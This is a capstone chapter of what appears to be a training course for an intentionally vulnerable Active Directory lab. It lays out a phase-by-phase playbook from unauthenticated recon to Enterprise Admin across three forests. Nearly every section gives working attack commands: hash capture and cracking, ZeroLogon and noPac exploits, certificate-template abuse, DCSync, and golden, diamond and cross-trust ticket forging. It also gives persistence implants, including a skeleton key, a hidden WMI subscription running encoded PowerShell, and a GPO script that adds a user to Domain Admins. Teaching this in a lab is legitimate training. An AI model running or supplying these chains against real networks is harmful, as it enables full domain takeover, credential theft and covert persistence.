# 14 — Capstone: Zero to Enterprise Admin Across Three Forests

This is the consolidation chapter. Everything from chapters 1–13, applied to DVAD end-to-end.

You start with: **an IP range, and nothing else.**
You end with: **Enterprise Admin in `root.corp`, Domain Admin in `finance.local`, Domain Admin in `eu.corp.local`, every flag in `C:\Flags\` captured, persistence stacked, a report written.**

We will walk one canonical path. There are dozens of alternates; once you finish this, you should be able to find them yourself.

This chapter is structured as a **playbook** — every phase has a goal, the commands to achieve it, the artefacts to save, the flags to record, and a "if this fails, fall back to X" alternate. It's the *operational* counterpart to the *theoretical* chapters that came before.

---

## 14.0 (Concept) Operational mindset

Before you type a single command:

1. **Map the network.** What's the address space? Which hosts respond? Which DCs? Which CAs? Which non-Windows boxes? You can't attack what you can't see.
2. **Establish a workspace.** `~/dvad/recon/`, `~/dvad/creds/`, `~/dvad/loot/`, `~/dvad/notes/`, `~/dvad/tools/`. Save *everything* — pcaps, raw LDAP dumps, every secretsdump output, every certipy run.
3. **Keep a log.** Date-stamped notes per host. You will forget which credential came from where after eight hours. Use markdown, one file per host: `notes/dc01.corp.local.md`, with sections: *Recon*, *Creds gained*, *Pivot points*, *Backdoors planted*, *Cleanup checklist*.
4. **One change at a time.** If two things change and the exploit fails, you can't unwind. Especially true for cert-template edits, ACL changes, and trust modifications.
5. **Hash everything.** Save `secretsdump` outputs raw, also save sha256s. Make it easy to prove provenance later.
6. **Time-stamp your activity.** Some defenders run sweeps based on time-windows. Note exact UTC for each significant action.

A red team operates from notes; an amateur operates from memory.

### Tooling baseline

Before you start, make sure on your attacker host you have:

- `impacket` (secretsdump, GetNPUsers, GetUserSPNs, psexec, wmiexec, smbexec, dcomexec, atexec, ticketer, getST, getTGT, addcomputer, rbcd, lookupsid)
- `nxc` / `netexec` (replaces crackmapexec)
- `bloodhound-python` + BloodHound CE GUI
- `certipy` (find/req/auth/shadow/forge/ca)
- `bloodyAD` (set password/add member/set rbcd/set owner/dacledit)
- `Responder` + `mitm6` + `ntlmrelayx` (impacket)
- `kerbrute` (userenum + spray)
- `hashcat` + `john` + wordlists (rockyou, weakpass_3, hashesorg)
- `enum4linux-ng`, `smbmap`, `ldapdomaindump`, `ldeep`, `adidnsdump`
- `mimikatz` (for any Windows pivot), `Rubeus`, `SharpHound`, `SharpGPOAbuse`, `Whisker`
- `pypykatz` (LSASS dump parser for Linux)
- `evil-winrm`, `nxc winrm` for shells

### File-naming convention

Within `~/dvad/`:

```
~/dvad/
├── recon/
│   ├── hosts.gnmap
│   ├── dc-ports.nmap
│   ├── users-anon.txt
│   ├── ldap-corp/                    # ldapdomaindump output
│   ├── bloodhound-corp.zip
│   ├── certipy-corp.txt
│   ├── shares.csv
│   └── notes.md
├── creds/
│   ├── ntlm.alice.<NT>
│   ├── ntlm.administrator.corp.<NT>
│   ├── ntlm.administrator.root.<NT>
│   ├── ntlm.administrator.finance.<NT>
│   ├── ntlm.administrator.eu.<NT>
│   ├── nt.krbtgt.corp.<NT>
│   ├── nt.krbtgt.eu.<NT>
│   ├── nt.krbtgt.root.<NT>
│   ├── nt.krbtgt.finance.<NT>
│   ├── trust.finance.<NT>
│   ├── trust.root.<NT>
│   ├── ccache.administrator.corp.ccache
│   ├── pfx.administrator.corp.pfx
│   ├── pfx.administrator.root.pfx
│   ├── keycred.administrator.corp.pem
│   └── kerb.hash
├── loot/
│   ├── corp-flags.txt
│   ├── eu-flags.txt
│   ├── root-flags.txt
│   ├── finance-flags.txt
│   └── all-flags.txt
└── notes/
    ├── 00-timeline.md
    ├── dc01.corp.local.md
    ├── ca01.corp.local.md
    ├── file01.corp.local.md
    ├── sql01.corp.local.md
    ├── ws01.corp.local.md
    ├── dc01.eu.corp.local.md
    ├── dc01.root.corp.md
    └── dc01.finance.local.md
```

The naming makes it easy to grep `~/dvad/creds/` for any credential you've found.

---

## 14.1 Phase 1 — Outside-in recon (no credentials)

Goal: discover topology, name the DCs and CAs, confirm which protocols are exposed, harvest user lists from anything anonymously accessible.

```bash
mkdir -p ~/dvad/{recon,creds,loot,notes,tools}
cd ~/dvad/recon

# 1.1 host discovery
nmap -sn 10.10.0.0/21 10.20.0.0/24 10.30.0.0/24 -oA hosts

# 1.2 service map of DC suspects
nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,5986 \
     10.10.0.10 10.10.0.11 10.20.0.10 10.30.0.10 -oA dc-ports

# 1.3 service map of likely CA / file / sql / ws
nmap -sV -p 80,135,139,389,443,445,1433,3389,5985,5986,8530 \
     10.10.0.12 10.10.0.13 10.10.0.14 10.10.0.100 -oA other-ports

# 1.4 DNS
dig @10.10.0.10 corp.local AXFR > dns-corp.txt
dig @10.10.0.10 _ldap._tcp.dc._msdcs.corp.local SRV >> dns-corp.txt
dig @10.10.0.10 _kerberos._tcp.dc._msdcs.corp.local SRV >> dns-corp.txt
dig @10.10.0.10 _gc._tcp.corp.local SRV >> dns-corp.txt
adidnsdump -u corp.local\\guest --include-tombstoned 10.10.0.10 > dns-adidns.txt

# 1.5 SMB null
enum4linux-ng -A 10.10.0.10 > enum-dc01.txt
nxc smb 10.10.0.10 -u '' -p '' --shares > nxc-anon.txt
nxc smb 10.10.0.10 -u guest -p '' --shares >> nxc-anon.txt

# 1.6 RID cycling (anonymous)
nxc smb 10.10.0.10 -u '' -p '' --rid-brute 5000 > rid-cycle.txt
grep SidTypeUser rid-cycle.txt | awk '{print $NF}' | cut -d\\ -f2 > users.txt

# 1.7 LDAP anon (IA-001)
ldapsearch -x -H ldap://10.10.0.10 -b 'DC=corp,DC=local' \
   '(objectClass=user)' samAccountName -LLL > users-anon.txt

grep samAccountName users-anon.txt | awk '{print $2}' >> users.txt
sort -u users.txt -o users.txt
wc -l users.txt
```

**Capture:** flag **IA-001** from anonymous LDAP read.

### What you should now know

- Three DCs: 10.10.0.10 (corp.local PDC), 10.10.0.11 (eu.corp.local), 10.20.0.10 (finance.local), 10.30.0.10 (root.corp).
- One CA: 10.10.0.12 (CA01).
- Members: 10.10.0.13 (file01), 10.10.0.14 (sql01), 10.10.0.100 (ws01).
- Subdomain / forest structure visible in `dns-corp.txt`.
- A user list. Even partial is useful for spraying.

Update `~/dvad/notes/00-timeline.md` with: "Phase 1 done at T+10min, N hosts found, user list size = X."

---

## 14.2 Phase 2 — Get the first credential

You have several mutually-non-exclusive paths to first cred. Run them in parallel where possible.

### Path A: LLMNR poison (no creds needed)

```bash
sudo responder -I dvad-ctf -wrf -v
# wait. DVAD has a scripted typo'd net use every ~5 min.
# Once a NetNTLMv2 arrives, crack:
hashcat -m 5600 hash.ntlmv2 /usr/share/wordlists/rockyou.txt
```

**Capture:** flag **IA-007**.

### Path B: AS-REP roast a no-preauth user (no creds needed)

```bash
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.0.10 \
    -format hashcat -outputfile ~/dvad/creds/asrep.hash
hashcat -m 18200 ~/dvad/creds/asrep.hash /usr/share/wordlists/rockyou.txt
```

**Capture:** flag **CRED-002**.

### Path C: SYSVOL GPP cpassword (once you have any cred)

```bash
impacket-Get-GPPPassword 'corp.local/alice:DVADlab2024!@10.10.0.10'
```

**Capture:** flag **IA-018**.

### Path D: Anonymous MSSQL on sql01

```bash
impacket-mssqlclient -windows-auth corp.local/guest@10.10.0.14
# if guest is enabled, then xp_dirtree to coerce sql01's machine account to Responder
```

**Capture:** **IA-021** if guest works.

### Path E: ZeroLogon (CVE-2020-1472)

```bash
python3 zerologon_tester.py DC01 10.10.0.10
# if vulnerable, exploit:
python3 cve-2020-1472-exploit.py DC01 10.10.0.10
# resets dc01$ machine acct password to empty
impacket-secretsdump -no-pass -just-dc 'corp.local/DC01$@10.10.0.10'
# CRITICAL: restore the password afterwards or break the domain:
python3 restorepassword.py DC01@DC01 -target-ip 10.10.0.10 -hexpass <orig>
```

**Capture:** **IA-025**.

### Path F: noPac (CVE-2021-42278)

```bash
impacket-addcomputer -computer-name 'attacker$' -computer-pass 'A!1' \
    -dc-host dc01.corp.local 'corp.local/guest:'
python3 noPac.py corp.local/guest -dc-ip 10.10.0.10 -dc-host DC01 \
    -shell --impersonate Administrator
```

**Capture:** **IA-026**.

At end of phase 2, you have *at minimum* `alice:DVADlab2024!` (or equivalent), and potentially `Administrator` directly.

### Phase 2 fallback decision tree

```
LLMNR did fire?      ──Yes──→ crack the hash
       │No
mitm6 working?       ──Yes──→ relay to LDAPS, set RBCD
       │No
anonymous LDAP gave names? ──Yes──→ AS-REP roast users
       │No
spray default lab pwd? ──Yes──→ DVADlab2024! works on at least one
       │No
ZeroLogon or noPac?  ──Yes──→ direct DA path
       │No
Resort to PetitPotam → ESC8 → DC machine cert → DCSync
```

---

## 14.3 Phase 3 — Authenticated enumeration

Now that you have *some* credential (say `alice:DVADlab2024!`), you can dump the directory.

```bash
cd ~/dvad/recon

# 3.1 LDAP dump (HTML + JSON + grep-able)
ldapdomaindump -u 'corp\alice' -p 'DVADlab2024!' 10.10.0.10 -o ldap-corp/

# 3.2 BloodHound
bloodhound-python -d corp.local -u alice -p 'DVADlab2024!' \
    -ns 10.10.0.10 -c All --zip

# 3.3 Cert templates
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
    -stdout -text -vulnerable > certipy-corp.txt

# 3.4 Share map (sweep entire range)
nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --shares > shares.txt
nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --loggedon-users > loggedon.txt
nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --sessions > sessions.txt
nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' --pass-pol > passpol.txt

# 3.5 Kerberoast everything
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
    -request -outputfile ~/dvad/creds/kerb.hash

# 3.6 Crack
hashcat -m 13100 ~/dvad/creds/kerb.hash /usr/share/wordlists/rockyou.txt

# 3.7 GPP — already covered, repeat with auth:
nxc smb 10.10.0.10 -u alice -p 'DVADlab2024!' -M gpp_password

# 3.8 LAPS read attempt
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' -M laps

# 3.9 gMSA enum
gMSADumper.py -u alice -p 'DVADlab2024!' -d corp.local

# 3.10 ADIDNS enum (authenticated)
adidnsdump -u corp.local\\alice -p 'DVADlab2024!' 10.10.0.10 > adidns-auth.txt

# 3.11 Trust enum
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --trusted-for-delegation
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --users
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --groups
ldapsearch -H ldap://10.10.0.10 -D 'CORP\alice' -w 'DVADlab2024!' \
   -b 'CN=System,DC=corp,DC=local' '(objectClass=trustedDomain)' \
   name trustType trustDirection trustAttributes flatName securityIdentifier
```

**Capture:** ENUM-001..030, CRED-001 (Kerberoast crack), plus whatever ESCs certipy reports.

### BloodHound queries to run immediately

Load the bloodhound zip into BloodHound CE. Run:

1. **Shortest path to Domain Admin from alice** — usually shows the intended chain.
2. **Find principals with DCSync rights** → spot `sync_user` or any non-DC principal.
3. **Find computers with unconstrained delegation** — file01 or sql01 probably.
4. **Find AS-REP roastable users** — confirms your earlier roast.
5. **Find Kerberoastable users** — same.
6. **Find principals with foreign domain group membership** — cross-forest hints.
7. **Map domain trusts** — visualises the forest graph.
8. **List all GPOs editable by non-DA** — for GPO-abuse paths.
9. **Computers where domain admins log on** — Tier-0 admin exposure (LSASS targets).
10. **Find shortest paths from anywhere to Tier-0** — global view.

Cypher example for finding any ACL path from alice → DA:

```cypher
MATCH p = shortestPath((u:User {name: 'ALICE@CORP.LOCAL'})-[*1..]->(g:Group {name: 'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p
```

### Wow, that's a lot of recon

Yes. Authenticated enum is where 60% of an engagement's time goes. The next phases will reuse all of this output.

---

## 14.4 Phase 4 — Domain Admin on corp.local

You should now have *enough* enumeration to spot the intended path. The fastest documented path in DVAD:

### 4.1 DCSync via sync_user

If `sync_user`'s password is set predictably (DVAD uses `DVADlab2024!`):

```bash
impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 \
    -just-dc > ~/dvad/creds/dcsync-corp.txt

grep -E '^(krbtgt|Administrator):' ~/dvad/creds/dcsync-corp.txt
```

Save the krbtgt NT hash to `~/dvad/creds/nt.krbtgt.corp.<hash>` and Administrator NT hash to `~/dvad/creds/ntlm.administrator.corp.<hash>`.

**Capture:** CRED-007.

### 4.2 Verify DA

```bash
nxc smb 10.10.0.10 -u Administrator -H <admin_NT>
# [+] CORP\Administrator (Pwn3d!)

# Also confirm cross-domain:
nxc smb 10.10.0.11 -u Administrator -H <admin_NT>
nxc smb 10.10.0.12 -u Administrator -H <admin_NT>
nxc smb 10.10.0.13 -u Administrator -H <admin_NT>
nxc smb 10.10.0.14 -u Administrator -H <admin_NT>
nxc smb 10.10.0.100 -u Administrator -H <admin_NT>
```

**Capture:** PE-* flags via PTH or shell.

### 4.3 Alternative if 4.1 doesn't work

If `sync_user` password isn't the lab default:

#### Alt A: Kerberoast a high-priv service account

```bash
hashcat -m 13100 ~/dvad/creds/kerb.hash rockyou.txt -O
# crack one of the SPN'd users
```

#### Alt B: ESC8 chain (PetitPotam → relay to ADCS)

```bash
# Terminal 1
sudo ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
    --adcs --template DomainController -smb2support

# Terminal 2
python3 PetitPotam.py -d corp.local -u alice -p 'DVADlab2024!' \
    attacker.corp.local 10.10.0.10

# After cert capture:
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10
# get dc01$ NT hash, then DCSync
impacket-secretsdump -hashes :<dc01$_NT> corp.local/'DC01$'@10.10.0.10 -just-dc
```

**Capture:** CRED-014, IA-024.

#### Alt C: ESC1 directly

```bash
# certipy already told us there's a vulnerable template
certipy req -u alice@corp.local -p 'DVADlab2024!' \
    -target ca01.corp.local -ca CORP-CA -template UserCertESC1 \
    -upn Administrator@corp.local -sid <admin_SID>

certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
# yields Administrator's NT hash
```

**Capture:** CRED-022.

#### Alt D: RBCD chain via MAQ

```bash
# Create computer
impacket-addcomputer -computer-name 'evil$' -computer-pass 'A!1' \
    'corp.local/alice:DVADlab2024!' -dc-host 10.10.0.10

# Find a writable computer (BloodHound)
# Use bloodyAD to set RBCD:
bloodyAD --host 10.10.0.10 -d corp.local -u alice -p 'DVADlab2024!' \
    set rbcd 'dc01$' 'evil$'

# S4U to impersonate Administrator
impacket-getST -spn 'cifs/dc01.corp.local' -impersonate Administrator \
    -dc-ip 10.10.0.10 'corp.local/evil$:A!1'

export KRB5CCNAME=Administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache
impacket-secretsdump -k -no-pass corp.local/Administrator@dc01.corp.local -just-dc
```

**Capture:** CRED-019.

---

## 14.5 Phase 5 — Persistence on corp.local

Don't sleep on this. The moment you have DA, plant a stack. Order them by *how long they survive cleanup*.

### 5.1 Cert persistence (survives password and krbtgt resets)

```bash
certipy req -u Administrator -hashes :<admin_NT> -dc-ip 10.10.0.10 \
    -target ca01.corp.local -ca CORP-CA -template User -upn Administrator@corp.local
mv administrator.pfx ~/dvad/creds/pfx.administrator.corp.pfx
```

**Capture:** PER-013.

### 5.2 Shadow credential on a protected user

```bash
certipy shadow auto -u Administrator@corp.local -hashes :<admin_NT> \
    -dc-ip 10.10.0.10 -account 'Administrator'
```

**Capture:** PER-017.

### 5.3 AdminSDHolder ACE

```bash
impacket-dacledit -action 'write' -rights 'FullControl' \
    -principal 'alice' \
    -target-dn 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
    'corp.local/Administrator@10.10.0.10' -hashes :<NT>
```

Force SDProp:

```powershell
PS> Set-ADObject -Identity 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=local' \
       -Replace @{RunProtectAdminGroupsTask=1}
```

**Capture:** PER-014.

### 5.4 Golden ticket (cheap, fast, very loud — only for short-term)

```bash
impacket-ticketer -nthash <krbtgt_NT> -aesKey <krbtgt_AES256> \
    -domain-sid <corp_SID> -domain corp.local Administrator
mv Administrator.ccache ~/dvad/creds/ccache.administrator.corp.ccache
```

**Capture:** PER-001.

### 5.5 Diamond ticket (quieter than Golden)

```
PS> .\Rubeus.exe diamond /user:alice /password:'DVADlab2024!' /enctype:aes256 \
        /krbkey:<krbtgt_AES256> /ticketuser:Administrator /ticketuserid:500 \
        /groups:512,513,518,519,520 /ptt
```

**Capture:** PER-003.

### 5.6 Skeleton key on dc01

```
PS> psexec -s -i \\dc01.corp.local cmd
> mimikatz.exe
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

Now every account in the domain accepts password `mimikatz`. Survives until dc01 reboots.

**Capture:** PER-007.

### 5.7 WMI subscription on file01

```powershell
$F = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
    Name='Updater'; EventNamespace='root\cimv2'; QueryLanguage='WQL';
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$C = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
    Name='Updater'; CommandLineTemplate='powershell.exe -nop -w hidden -enc <base64>'
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
    Filter=$F; Consumer=$C
}
```

**Capture:** PER-035.

### 5.8 GPO startup script

```bash
SharpGPOAbuse.exe --AddComputerScript --ScriptType Startup \
    --ScriptName 'updater.bat' --ScriptContents 'net group "Domain Admins" alice /add /domain' \
    --GPOName 'Default Domain Controllers Policy'
```

**Capture:** PER-021.

---

## 14.6 Phase 6 — Lateral sweep through corp.local

Now harvest every host:

```bash
# 6.1 List every host you can shell on
nxc smb 10.10.0.0/21 -u Administrator -H <admin_NT>

# 6.2 Dump LSASS on each
nxc smb 10.10.0.13 -u Administrator -H <admin_NT> -M lsassy
nxc smb 10.10.0.14 -u Administrator -H <admin_NT> -M lsassy
nxc smb 10.10.0.100 -u Administrator -H <admin_NT> -M lsassy

# 6.3 Read every flag
for h in 10.10.0.10 10.10.0.11 10.10.0.12 10.10.0.13 10.10.0.14 10.10.0.100; do
   nxc smb $h -u Administrator -H <admin_NT> -x 'type C:\Flags\*.txt' \
       2>/dev/null | tee -a ~/dvad/loot/corp-flags.txt
done
```

**Capture:** all PE-*, LAT-*, host-local flags.

### 6.4 sql01-specific

```bash
impacket-mssqlclient -windows-auth corp.local/Administrator@10.10.0.14 -hashes :<NT>
1> EXEC xp_cmdshell 'type C:\Flags\*.txt'

# Linked server enum
1> SELECT * FROM sys.linked_servers
1> EXEC ('SELECT name FROM master.sys.databases') AT [FINANCE_SQL]

# Try OPENQUERY via linked server (CRED-060)
1> SELECT * FROM OPENQUERY([FINANCE_SQL], 'SELECT system_user, db_name()')
```

**Capture:** CRED-053, CRED-060.

### 6.5 file01-specific (SSH + WebDAV)

```bash
# Linux interop side
ssh administrator@10.10.0.13   # try password from DCSync

# WebClient enabled?
nxc smb 10.10.0.13 -u Administrator -H <NT> -M webclient
```

### 6.6 ws01-specific

```bash
# AlwaysInstallElevated check
nxc smb 10.10.0.100 -u Administrator -H <NT> -x 'reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated'

# Browser DPAPI
nxc smb 10.10.0.100 -u Administrator -H <NT> -M browser_credentials
```

**Capture:** PE-031, CRED-051.

---

## 14.7 Phase 7 — eu.corp.local (child domain)

`eu.corp.local` is a child of `corp.local`. You're already EA-equivalent of the parent → admin of the child (within-forest, SID filtering does not apply).

```bash
# DCSync the child
impacket-secretsdump -hashes :<corp_admin_NT> 'corp.local/Administrator@dc01.eu.corp.local' \
    -just-dc -domain eu.corp.local > ~/dvad/creds/dcsync-eu.txt

grep -E '^(krbtgt|Administrator):' ~/dvad/creds/dcsync-eu.txt
```

**Capture:** ENUM/CRED flags in eu, DF-002.

### 7.2 Mass-read eu flags

```bash
for h in dc01.eu.corp.local; do
    nxc smb $h -u Administrator -H <eu_admin_NT> -x 'type C:\Flags\*.txt' \
        >> ~/dvad/loot/eu-flags.txt
done
```

---

## 14.8 Phase 8 — root.corp (forest root via SID history)

`root.corp` is the forest root; `corp.local` is its child. Forest = security boundary, but within a forest SID filtering does NOT apply on parent–child trust → SID history injection works.

### 8.1 Get root.corp's SID

```bash
nxc ldap 10.30.0.10 -u Administrator -H <corp_admin_NT> \
    --query '(objectclass=domain)' 'objectSid'
# or:
impacket-lookupsid -hashes :<corp_admin_NT> corp.local/Administrator@10.30.0.10 0
```

Save it as `<root_SID>`.

### 8.2 Forge a Golden TGT in corp with ExtraSid for root EA

```bash
impacket-ticketer -nthash <corp_krbtgt_NT> -domain-sid <corp_SID> \
    -domain corp.local -extra-sid <root_SID>-519 Administrator

export KRB5CCNAME=Administrator.ccache

# Request a TGS for root.corp DC service
impacket-getST -k -no-pass -spn 'cifs/dc01.root.corp' -dc-ip 10.30.0.10 \
    'corp.local/Administrator'

# Use it
export KRB5CCNAME=Administrator@cifs_dc01.root.corp@ROOT.CORP.ccache
impacket-psexec -k -no-pass dc01.root.corp
```

**Capture:** DF-001, DF-002.

### 8.3 DCSync root.corp

```bash
impacket-secretsdump -k -no-pass -just-dc 'corp.local/Administrator@dc01.root.corp' \
    > ~/dvad/creds/dcsync-root.txt
```

You now have krbtgt of root.corp → full forest compromise.

### 8.4 Plant cert persistence in root.corp

If root.corp has its own CA, or if corp-ca is also trusted in root.corp, request an EA cert:

```bash
certipy req -u Administrator@root.corp -hashes :<root_admin_NT> \
    -dc-ip 10.30.0.10 -target ca01.corp.local -ca CORP-CA \
    -template User -upn Administrator@root.corp
mv administrator.pfx ~/dvad/creds/pfx.administrator.root.pfx
```

**Capture:** DF-009.

### 8.5 Mass-read root flags

```bash
nxc smb dc01.root.corp -u Administrator -H <root_admin_NT> \
    -x 'type C:\Flags\*.txt' >> ~/dvad/loot/root-flags.txt
```

---

## 14.9 Phase 9 — finance.local (external forest)

`finance.local` is an *external forest trust*. SID filtering normally blocks the SID history trick. DVAD removes the `QUARANTINED_DOMAIN` bit for educational purposes; we'll exploit the trust ticket forge.

### 9.1 Dump the trust key

The trust object's password lives on a DC of the trusting side. DCSync the trust object — secretsdump returns it implicitly via -just-dc:

```bash
impacket-secretsdump -just-dc -hashes :<admin_NT> corp.local/Administrator@dc01.corp.local \
    | grep -i 'finance\|FINANCE' > ~/dvad/creds/trust-finance.txt

# entry: CORP.LOCAL\FINANCE$:aes256-cts-hmac-sha1-96:<aes256_key>
#        or CORP.LOCAL\FINANCE$:<NT_trust_key>
```

Save the AES256 (preferred) and NT (fallback) keys.

### 9.2 Forge inter-realm TGT

```bash
# Get finance.local SID
nxc ldap 10.20.0.10 -u Administrator -H <corp_admin_NT> \
    --query '(objectclass=domain)' 'objectSid'
# save as <finance_SID>

impacket-ticketer -nthash <trust_NT> -domain-sid <corp_SID> -domain corp.local \
    -extra-sid <finance_SID>-519 -spn 'krbtgt/FINANCE.LOCAL' Administrator
```

### 9.3 Use it

```bash
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn 'cifs/dc01.finance.local' -dc-ip 10.20.0.10 corp.local/Administrator

export KRB5CCNAME=Administrator@cifs_dc01.finance.local@FINANCE.LOCAL.ccache
impacket-psexec -k -no-pass dc01.finance.local
```

**Capture:** DF-005, DF-006, DF-007.

### 9.4 DCSync finance.local

```bash
impacket-secretsdump -k -no-pass -just-dc 'corp.local/Administrator@dc01.finance.local' \
    > ~/dvad/creds/dcsync-finance.txt
```

You now hold krbtgt for all three forests. Game over.

### 9.5 Plant cert persistence

If finance has its own CA, mirror §8.4 to issue an Administrator PFX in finance.

### 9.6 Mass-read finance flags

```bash
nxc smb dc01.finance.local -u Administrator -H <finance_admin_NT> \
    -x 'type C:\Flags\*.txt' >> ~/dvad/loot/finance-flags.txt
```

---

## 14.10 Phase 10 — Loot consolidation

```bash
# Collect every flag from every host
for h in dc01.corp.local dc01.eu.corp.local ca01.corp.local file01.corp.local \
         sql01.corp.local ws01.corp.local dc01.root.corp dc01.finance.local; do
   nxc smb $h -u Administrator -H <local_admin_NT> -x 'type C:\Flags\*.txt' \
       >> ~/dvad/loot/all-flags.txt 2>/dev/null
done

# Sort, dedupe, count
sort -u ~/dvad/loot/all-flags.txt > ~/dvad/loot/final.txt
wc -l ~/dvad/loot/final.txt
```

Compare against the 382 IDs in PLAN.md. Anything missing is a side quest.

### 10.1 Sanity-check report

Create `~/dvad/loot/coverage.csv`:

```
Phase,FlagID,Captured,Method
1,IA-001,yes,anonymous LDAP
2,CRED-002,yes,GetNPUsers + hashcat
2,IA-007,yes,Responder LLMNR + hashcat
3,CRED-001,yes,Kerberoast + hashcat
4,CRED-007,yes,secretsdump as sync_user
5,PER-001,yes,impacket-ticketer Golden
...
```

This is what becomes your report appendix.

---

## 14.11 Side quests (the long tail)

A non-exhaustive list of techniques you should now try as targeted exercises:

- **ESC1–ESC16** — one of each, even if not the shortest path. (Chapter 6.)
- **RBCD chain** with MachineAccountQuota — even though you have DA, do it from a low-priv standpoint. (CRED-019.)
- **PetitPotam unauthenticated** — pretend you don't have alice. (IA-024.)
- **ZeroLogon** — same. (Phase 2 of zero-cred path.)
- **noPac** — same. (CRED-026.)
- **Shadow credentials** against `sql01$` then `cifs/sql01.corp.local` as DA. (CRED-027.)
- **DCShadow** to set `sIDHistory` on a regular user — see SDProp react. (PER-026.)
- **AdminSDHolder** — implant GenericAll for alice. (PER-014.)
- **GPO abuse** — add a startup script to Default Domain Policy. (PE-038.)
- **Skeleton key** — `misc::skeleton` and observe both passwords work. (PER-007.)
- **Backup Operators** path — log in as one, use SeBackupPrivilege to dump NTDS. (PE-027.)
- **DnsAdmins** path — load `evil.dll` via DNS. (PE-014.)
- **Server Operators** path — change a service binPath. (PE-029.)
- **TRUSTWORTHY chain** in sql01. (CRED-053.)
- **Linked server** OPENQUERY exec in finance-sql. (CRED-060.)
- **gMSA dump** with gMSADumper. (CRED-024.)
- **LAPS dump** with nxc. (CRED-041.)
- **WSUS poisoning** — if ws01 has WSUS pointing to a controllable server. (IA-027.)
- **SCCM** privilege escalation — NAA cred, PXE boot. (LAT-022..025.)
- **ESC8 from anonymous** — HTTP enrollment without auth. (IA-022.)
- **DCOM lateral via MMC20.Application** — wsman alternative. (LAT-007.)
- **Token impersonation** with SharpToken — abuse a logged-in DA token without LSASS. (LAT-013.)
- **mitm6 + ldap relay** — IPv6 takeover. (IA-013.)
- **Coerced SQL connection** — xp_dirtree to Responder. (CRED-061.)
- **WriteOwner exploitation** — flip ownership, then DACL. (PE-040.)
- **GenericWrite on group** — add self. (PE-041.)
- **SeImpersonate Potato** — DCOMPotato, GodPotato, JuicyPotato variants on sql01. (PE-015..018.)
- **Print Operators driver install** — privilege escalation via SeLoadDriverPrivilege. (PE-019.)
- **Account Operators new user** — alice creates a user, adds to group via writeProperty. (PE-020.)
- **Forge a TGT and use it to read GC** — confirm cross-domain visibility. (DF-003.)
- **DCShadow + sIDHistory** to inject EA. (DF-021.)

For each, write a one-paragraph note: *what was the precondition, what was the trick, what's the detection signal*.

---

## 14.12 The "if I had to do it again in two hours" path

The minimal critical path, end-to-end:

```
[0:00] nmap -sV -p 53,88,389,445 10.10.0.0/21
[0:05] ldapsearch -x -H ldap://10.10.0.10 -b 'DC=corp,DC=local' '(objectClass=user)' samAccountName > users.txt
[0:10] impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.0.10 -format hashcat > asrep
[0:15] hashcat -m 18200 asrep rockyou.txt
[0:20] # crack yields alice:DVADlab2024!
[0:21] bloodhound-python -d corp.local -u alice -p 'DVADlab2024!' -ns 10.10.0.10 -c All
[0:35] # BloodHound shows sync_user has DCSync; alice can pwn sync_user via GenericWrite
[0:36] bloodyAD --host 10.10.0.10 -d corp.local -u alice -p 'DVADlab2024!' set password sync_user 'NewPass1!'
[0:38] impacket-secretsdump corp.local/sync_user:'NewPass1!'@10.10.0.10 -just-dc-user krbtgt
[0:40] # have krbtgt
[0:41] impacket-secretsdump corp.local/sync_user:'NewPass1!'@10.10.0.10 -just-dc-user Administrator
[0:43] # have admin NT
[0:45] # forge Golden + ExtraSid for root.corp 519
[0:50] # forge inter-realm TGT for finance.local using trust key from -just-dc
[1:00] # DCSync root.corp and finance.local
[1:05] # mass-read flags
[1:30] # write report
```

If you can replay this from muscle memory, you have **internalised** AD attack surface.

### 14.12.1 The "ten-minute proof of concept"

For demo / CTF speed-run:

```bash
# All in one shell
USER=alice; PASS='DVADlab2024!'; DC=10.10.0.10; DOMAIN=corp.local
impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC -format hashcat > asrep
hashcat -m 18200 asrep /usr/share/wordlists/rockyou.txt --quiet
impacket-secretsdump $DOMAIN/sync_user:$PASS@$DC -just-dc-user krbtgt
impacket-secretsdump $DOMAIN/sync_user:$PASS@$DC -just-dc-user Administrator
NT=<extracted_admin_NT>
nxc smb $DC -u Administrator -H $NT -x 'type C:\Flags\CAPSTONE.txt'
```

That's a 10-line capstone.

---

## 14.13 Cleanup checklist

Before you call the engagement done, *if it's an authorised engagement*, undo what you implanted. This is the "professional vs amateur" boundary.

| Action | Cleanup |
|---|---|
| `addcomputer evil$` | `bloodyAD ... remove computer 'evil$'` |
| Set RBCD on dc01$ | `bloodyAD ... remove rbcd 'dc01$'` |
| Reset sync_user password | restore via Set-ADAccountPassword |
| AdminSDHolder ACE for alice | dacledit -action remove |
